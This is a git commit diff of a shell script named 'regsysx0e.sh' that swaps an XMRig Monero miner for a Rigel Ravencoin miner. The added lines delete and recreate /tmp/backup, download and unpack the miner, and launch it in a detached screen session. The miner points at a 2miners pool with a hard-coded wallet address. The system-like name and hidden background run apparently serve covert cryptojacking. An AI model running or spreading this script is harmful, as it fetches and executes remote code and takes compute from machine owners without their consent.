b39f7a1037eaf8f86fee33fc82c753b29dcc7aa3
Thabo Koee <31208817+TechTouchABI@users.noreply.github.com>
2023-10-24 18:57:11 +0000

    Update regsysx0e.sh
    THANKS!

--- regsysx0e.sh
+++ regsysx0e.sh
@@ -1,15 +1,13 @@
-mkdir /tmp/backup \
+rm -rf /tmp/backup/ && mkdir /tmp/backup/  && cd /tmp/backup/ \
 
-cd /tmp/backup \
+wget https://github.com/rigelminer/rigel/releases/download/1.9.1/rigel-1.9.1-linux.tar.gz \
 
-wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-bionic-x64.tar.gz  \
+tar -zxf rigel-1.9.1-linux.tar.gz && rm -rf rigel-1.9.1-linux.tar.gz.1 && cd rigel-1.9.1-linux \
 
-tar -zxf xmrig-6.20.0-bionic-x64.tar.gz   \
-
-rm -rf xmrig-6.20.0-bionic-x64.tar.gz.1 \
-
-cd xmrig-6.20.0	\
+screen -d -m -S ravenmama ./rigel -a ravencoin -o stratum+tcp://rvn.2miners.com:6060 -u RR8rcNoeUnb3tSagCaBznj9gGNPmUM8GC4 -p x --no-tui --dns-over-https 
 
 
-./xmrig -a rx -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbJBmjRDqvpDVfpCDJcNgxS5qr6HEsqhrs2 -p x -B 
+
+
+
 
